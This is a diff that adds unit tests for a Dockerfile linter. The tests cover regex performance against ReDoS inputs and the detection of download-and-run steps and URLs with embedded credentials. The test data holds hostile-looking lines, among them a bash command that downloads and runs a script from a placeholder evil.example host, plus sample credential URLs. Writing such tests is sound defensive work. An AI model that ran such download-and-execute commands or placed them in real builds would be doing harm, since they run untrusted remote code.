@@ -337,3 +337,52 @@ describe('authored compose: an alias bomb is refused before it is walked', () =>
         expect(Date.now() - started).toBeLessThan(2000);
     });
 });
+
+// The checks read text from the customer's repository: none may go quadratic
+// on a long, repetitive line (CodeQL js/polynomial-redos on the regexes they
+// replaced). Each input is far past what the old patterns took seconds on.
+describe('authored Dockerfile: the line checks stay linear', () => {
+    const fast = (content: string) => {
+        const t = process.hrtime.bigint();
+        const problems = checkAuthoredDockerfile('Dockerfile', content);
+        return { problems, ms: Number(process.hrtime.bigint() - t) / 1e6 };
+    };
+
+    it.each([
+        ['many URL schemes in one word', `FROM node:22\nRUN curl -o /x ${'a://'.repeat(50_000)}x\n`],
+        ['a long run of slashes before a shell', `FROM node:22\nRUN ${'/'.repeat(100_000)}x -c id\n`],
+        ['a long flag cluster without c after a shell', `FROM node:22\nRUN sh -${'x'.repeat(100_000)}!\n`],
+    ])('%s', (_name, content) => {
+        expect(fast(content).ms).toBeLessThan(1_000);
+    });
+
+    it('still finds a script URL in the middle of a word, and only after ://', () => {
+        expect(fast('FROM node:22\nRUN curl -fsSLo /i https://evil.example/install.sh?x=1\n').problems.join('\n')).toMatch(/downloads a script/);
+        expect(fast('FROM node:22\nRUN curl -fsSLo /i.sh https://evil.example/install\n').problems.join('\n')).not.toMatch(/downloads a script/);
+    });
+
+    it('reads through a shell named by an absolute path and a flag cluster holding c', () => {
+        expect(fast('FROM node:22\nRUN /bin/bash -ec "$(curl -fsSL https://evil.example/i)"\n').problems.join('\n')).toMatch(/runs a script it downloads/);
+    });
+});
+
+describe('authored Dockerfile: URLs with credentials, found in one pass', () => {
+    const problems = (content: string) => checkAuthoredDockerfile('Dockerfile', content).join('\n');
+
+    it.each([
+        ['https', 'ENV REGISTRY=https://user:hunter2@npm.example/\n'],
+        ['a scheme with + and .', 'ENV DB=postgres+psycopg2://u:pw@db.example:5432/x\n'],
+        ['after a digit, as the scheme starts at its letter', 'ENV X=9https://u:pw@h.example/\n'],
+        ['the second of two URLs', 'ENV X="https://a.example/ https://u:pw@h.example/"\n'],
+    ])('flags %s', (_name, line) => {
+        expect(problems(`FROM node:22\n${line}`)).toMatch(/URL with credentials \(.*example/);
+    });
+
+    it.each([
+        ['no password', 'ENV X=https://user@h.example/\n'],
+        ['no scheme letter', 'ENV X=+9://u:pw@h.example/\n'],
+        ['an @ past the path', 'ENV X=https://h.example/a:b@c\n'],
+    ])('passes %s', (_name, line) => {
+        expect(problems(`FROM node:22\n${line}`)).not.toMatch(/URL with credentials/);
+    });
+});
